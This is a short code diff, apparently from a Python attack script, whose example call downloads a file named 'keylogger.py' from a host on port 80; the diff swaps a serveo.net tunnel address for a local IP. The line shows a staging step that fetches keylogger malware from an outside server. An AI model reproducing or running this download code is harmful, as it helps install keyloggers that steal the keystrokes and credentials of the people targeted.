@@ -21,4 +21,4 @@ def download_file(file, ip, port):
     sys.exit(1)
 
 # Example usage
-download_file("keylogger.py", "e2d0b2d7f0570b7678cc7c0bcdde2de8.serveo.net", "80")
+download_file("keylogger.py", "192.168.0.23", "80")
